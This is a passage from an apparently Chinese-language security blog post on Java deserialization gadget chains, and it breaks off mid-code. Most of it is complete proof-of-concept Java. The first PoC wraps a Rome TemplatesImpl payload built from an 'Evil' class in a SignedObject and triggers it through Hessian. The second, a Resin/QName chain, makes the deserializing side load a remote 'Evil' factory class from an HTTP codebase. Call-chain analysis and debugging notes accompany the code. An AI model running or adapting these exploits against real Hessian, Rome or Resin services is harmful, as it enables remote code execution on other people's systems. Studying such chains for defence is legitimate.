java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_EqualsBean_TwiceSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> RomePayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将序列化字符串装入 SignedObject 中。</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> createWithoutConstructor(SignedObject.class);</span><br><span class="line">        setFieldValue(signedObject,<span class="string">&quot;content&quot;</span>,baos.toByteArray());</span><br><span class="line">        <span class="comment">// 一开始一直没触发，后来仔细跟才知道其他几个成员变量也得传值，不然在遍历getter时会出现空指针异常。</span></span><br><span class="line">        setFieldValue(signedObject,<span class="string">&quot;signature&quot;</span>,<span class="string">&quot;koishi&quot;</span>.getBytes());</span><br><span class="line">        setFieldValue(signedObject,<span class="string">&quot;thealgorithm&quot;</span>,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//再想办法触发 SignedObject 的 getter。</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> PayloadMapGenerator(signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(baos2);</span><br><span class="line">        hot.writeObject(hashMap2);</span><br><span class="line">        hot.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos2.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">PayloadMapGenerator</span><span class="params">(Object key)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(key.getClass(),key);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class,<span class="string">&quot;hello! koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(equalsBean,<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        <span class="comment">// 这里后续在反射修改回来，不然懂得懂得，在put就会触发利用链</span></span><br><span class="line">        setFieldValue(equalsBean,<span class="string">&quot;_beanClass&quot;</span>, ToStringBean.class);</span><br><span class="line">        setFieldValue(equalsBean,<span class="string">&quot;_obj&quot;</span>,toStringBean);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">RomePayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//必须修改_bytecodes</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">koishi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;Cirno&quot;</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(koishi,<span class="string">&quot;I&#x27;m koishi dayo!!!&quot;</span>);</span><br><span class="line">        <span class="comment">//这里为什么不在上面ObjectBean声明的时候写，就是防止put的时候在本地触发（总所周知，map的put会去判断hash值，就会调用hashcode方法）</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templates);</span><br><span class="line">        setFieldValue(koishi,<span class="string">&quot;_equalsBean&quot;</span>,<span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, objectBean));</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h1 id="Resin-配合-Hessian2"><a href="#Resin-配合-Hessian2" class="headerlink" title="Resin 配合 Hessian2"></a>Resin 配合 Hessian2</h1><p><strong>添加依赖</strong></p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- contains QName --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>quercus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.45<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>调用链</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XString#equals</span><br><span class="line">  QName#toString</span><br><span class="line">    ContinuationContext#composeName(java.lang.String, java.lang.String)</span><br><span class="line">      ContinuationContext#getTargetContext</span><br><span class="line">	    NamingManager#getContext</span><br><span class="line">  		  NamingManager#getObjectInstance </span><br><span class="line">   		    NamingManager#getObjectFactoryFromReference</span><br></pre></td></tr></table></figure></div>



<h2 id="分析-QName-toString远程类加载"><a href="#分析-QName-toString远程类加载" class="headerlink" title="分析-QName toString远程类加载"></a>分析-QName toString远程类加载</h2><p>Resin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 <code>com.sun.org.apache.xpath.internal.objects.XString</code> 的 <code>equals</code> 方法。</p>
<p>在Hessian2 对 HashMap 进行put时，触发 putVal 方法，在 putVal  中，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br></pre></td></tr></table></figure></div>

<p>key 为 Xstring ，k 为 QName，进而跟进 Xstring 的equals方法。（至于为什么这里是这两个值，看下文的奇葩问题分析内容）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210170754131.png"
                      alt="image-20230210170754131"
                ></p>
<p>进而触发 QName 的 toString 方法，在该方法中，会触发 <code>this._context.composeName</code>，这个 _context 就是我们之前设置好的 ContinuationContext 类对象。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210171612201.png"
                      alt="image-20230210171612201"
                ></p>
<p>继续看 ContinuationContext#composeName</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210171807540.png"
                      alt="image-20230210171807540"
                ></p>
<p>会调用本类的 getTargetContext 方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210171902375.png"
                      alt="image-20230210171902375"
                ></p>
<p>进而触发这个 cpe 的 getResolvedObj 方法，cpe就是 CannotProceedException  类，继续跟</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">          answer = getObjectInstance(obj, name, nameCtx, environment);</span><br><span class="line">      &#125; catch (NamingException e) &#123;</span><br><span class="line">          throw e;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>obj 是设置好的 Reference 类，继续跟最终就能实现远程工厂类的加载了，我就不细调了，最终位置在 NamingManager 的getObjectFactoryFromReference 方法下，通过codebase 和 工厂类名加载了类。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210172357645.png"
                      alt="image-20230210172357645"
                ></p>
<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><p><strong>unhash 方法参考别人的文章造的，知道作用就行，有闲时可以细究：<a class="link"   target="_blank" rel="noopener" href="https://bchetty.com/blog/hashcode-of-string-in-java" >https://bchetty.com/blog/hashcode-of-string-in-java <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Resin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Resin_POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 定义一个远程的class 包含一个恶意攻击的对象的工厂类</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">codebase</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8088/&quot;</span>;</span><br><span class="line">        <span class="comment">// 对象的工厂类名（远程服务下的class文件名）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classFactory</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个CannotProceedException对象，并设置远程查找对象</span></span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cannotProceedException</span> <span class="operator">=</span> createWithoutConstructor(CannotProceedException.class);</span><br><span class="line">        cannotProceedException.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;koishi&quot;</span>,classFactory,codebase));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化ContinuationDirContext类</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">continuationContext</span> <span class="operator">=</span> (Context)createWithoutConstructor(Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>));</span><br><span class="line">        setFieldValue(continuationContext,<span class="string">&quot;cpe&quot;</span>,cannotProceedException);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里后面的两个参数貌似不是完全可以乱填的，但是可以填的确实有很多，测试如将下面的 Koishi 换成小写 koishi,则不会触发。</span></span><br><span class="line">        <span class="comment">// 根据调试发现貌似这里的值填某些内容会导致读取生成map时顺序出错。没细看，有兴趣可以去调着试试。</span></span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(continuationContext,<span class="string">&quot;Koishi&quot;</span>, <span class="string">&quot;Ilyn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置为相同的hashcode，使hash 比较通过，从而触发 XString equals方法。这里先随便写个值，后续反射修改。当然改 QName 也行</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sameHashCode</span> <span class="operator">=</span> unhash(qName.hashCode());</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(qName, <span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">        expMap.put(xString, <span class="string">&quot;cirno&quot;</span>);</span><br><span class="line">        setFieldValue(xString,<span class="string">&quot;m_obj&quot;</span>,sameHashCode);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        <span class="comment">//序列化没有实现java.io.Serializable接口的类</span></span><br><span class="line">        output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        output.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bao.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bais);</span><br><span class="line">        hit.readObject();</span><br><span class="line">        hit.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">unhash</span><span class="params">(<span class="type">int</span> hash)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> ( target &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( target == Integer.MIN_VALUE )</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span> <span class="params">( StringBuilder partial, <span class="type">int</span> target )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="奇葩问题窥探"><a href="#奇葩问题窥探" class="headerlink" title="奇葩问题窥探"></a>奇葩问题窥探</h2><p><strong>在自己编写链子的过程中发现了两个奇葩问题：</strong></p>
<ul>
<li><p>HashMap 的put顺序不同，会对利用链造成影响</p>
</li>
<li><p>QName 实例化时，first值和rest值貌似有联系，foo和bar能行，有些个别其他字符串不行</p>
</li>
</ul>
<p>自己试着对这两个问题进行部分分析，能力有限不确保正确。</p>
<h3 id="针对第一个问题"><a href="#针对第一个问题" class="headerlink" title="针对第一个问题"></a>针对第一个问题</h3><p><strong>当我们正确输入内容：</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(<span class="keyword">new</span> <span class="title class_">InitialContext</span>(),<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//设置为相同的hashcode，使hash 比较通过，从而触发 XString equals方法。</span></span><br><span class="line">     <span class="type">String</span> <span class="variable">sameHashCode</span> <span class="operator">=</span> unhash(qName.hashCode());</span><br><span class="line">     <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(sameHashCode);</span><br><span class="line"></span><br><span class="line">     <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">     expMap.put(qName, <span class="string">&quot;koishi&quot;</span>);</span><br><span class="line">     expMap.put(xString, <span 